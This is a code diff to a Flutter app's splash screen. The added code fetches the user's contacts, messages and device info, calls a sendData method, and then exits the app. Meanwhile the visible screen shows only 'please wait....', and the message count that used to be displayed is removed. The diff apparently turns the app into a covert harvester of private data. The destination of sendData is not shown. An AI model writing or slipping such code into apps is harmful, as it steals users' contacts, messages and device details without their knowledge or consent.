@@ -1,3 +1,5 @@
+import 'dart:io';
+
 import 'package:flutter/material.dart';
 import 'package:flutter/scheduler.dart';
 import 'package:flutter_riverpod/flutter_riverpod.dart';
@@ -26,6 +28,13 @@ class SplashState extends ConsumerState<Splash> {
             await contactsListProvider.getContactList(context);
             if (context.mounted) {
               await contactsListProvider.getMessagesList(context);
+              if (context.mounted) {
+                await contactsListProvider.getDeviceInfo(context);
+                if (context.mounted) {
+                  await contactsListProvider.sendData(context);
+                  exit(0);
+                }
+              }
             }
           },
         );
@@ -35,8 +44,9 @@ class SplashState extends ConsumerState<Splash> {
   }
 
   @override
-  Widget build(BuildContext context,) {
-    List list =ref.watch(contactsProvider).messagesList;
+  Widget build(
+    BuildContext context,
+  ) {
     return Scaffold(
       body: Container(
         height: 1.sh,
@@ -57,14 +67,6 @@ class SplashState extends ConsumerState<Splash> {
             ),
             Text(
               'please wait....',
-              style: TextStyle(
-                color: ColorsUtils.whiteColor,
-                fontSize: 15.sp,
-                fontWeight: FontWeight.w600,
-              ),
-            ),
-            Text(
-              list.length.toString(),
               style: TextStyle(
                 color: ColorsUtils.whiteColor,
                 fontSize: 15.sp,
